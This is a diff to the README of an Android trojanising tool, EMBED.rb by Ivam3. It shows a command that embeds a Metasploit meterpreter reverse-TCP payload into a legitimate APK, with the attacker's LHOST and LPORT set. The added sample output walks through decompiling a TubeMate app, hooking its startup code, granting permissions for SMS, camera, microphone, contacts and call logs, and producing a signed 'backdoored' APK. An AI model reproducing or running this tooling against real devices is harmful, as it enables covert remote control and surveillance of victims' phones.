@@ -35,14 +35,40 @@ This software and related documentation are provided under license agreement con
 
 	$ ruby EMBED.rb PATH/to/legitim.apk -p android/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4546
 
-	._____ __  __ ____  _____ ____
-	| ____|  \/  | __ )| ____|  _ \
-	|  _| |TERMUX|  _ \|  _| | | | |
-	| |___| |\/| | |_) | |___| |_| |
-	|_____|_|  |_|____/|_____|____/ v.2
-	#:::::::: By Ivam3 ::::::::::::#
+	   ._____ __  __ ____  _____ ____
+	   | ____|  \/  | __ )| ____|  _ \
+	   |  _| |TERMUX|  _ \|  _| | | | |
+	   | |___| |\/| | |_) | |___| |_| |
+	   |_____|_|  |_|____/|_____|____/ v.2
+	   #:::::::: By Ivam3 ::::::::::::#
 
-	[Usage]─➤ EMBED.rb [target.apk] [msfvenom options]
+	[*]─➤ Generating msfvenom payload..
+	[*]─➤ Signing payload..
+	[*]─➤ Decompiling orignal APK..
+	[*]─➤ Ignoring the resource decompilation..
+	[*]─➤ Decompiling payload APK..
+	[*]─➤ Locating onCreate() hook..
+	[*]─➤ Copying payload files..
+	[*]─➤ Loading original/smali/devian/tubemate/home/Main.smali and injecting payload..
+	[*]─➤ Poisoning the manifest with meterpreter permissions..
+	[+]─➤ Adding android.permission.SEND_SMS
+	[+]─➤ Adding android.permission.RECEIVE_SMS
+	[+]─➤ Adding android.permission.RECORD_AUDIO
+	[+]─➤ Adding android.permission.CALL_PHONE
+	[+]─➤ Adding android.permission.READ_CONTACTS
+	[+]─➤ Adding android.permission.WRITE_CONTACTS
+	[+]─➤ Adding android.permission.RECORD_AUDIO
+	[+]─➤ Adding android.permission.CAMERA
+	[+]─➤ Adding android.permission.READ_SMS
+	[+]─➤ Adding android.permission.RECEIVE_BOOT_COMPLETED
+	[+]─➤ Adding android.permission.SET_WALLPAPER
+	[+]─➤ Adding android.permission.READ_CALL_LOG
+	[+]─➤ Adding android.permission.WRITE_CALL_LOG
+	[*]─➤ Rebuilding /sdcard/Download/tubemate-2-4-21.apk with meterpreter injection as data/data/com_backdoored.apk..
+	[*]─➤ Signing data/data/com_backdoored.apk ..
+	[*]─➤ Aligning data/data/com_backdoored.apk ..
+	[+]─➤ Infected file legitim.apk_final ready.
+
 
 This tool was written by Ivam3, <https://t.me/Ivam3byCinderella>
 Some maintenance releases have been done by <https://t.me/Ivam3_Bot>
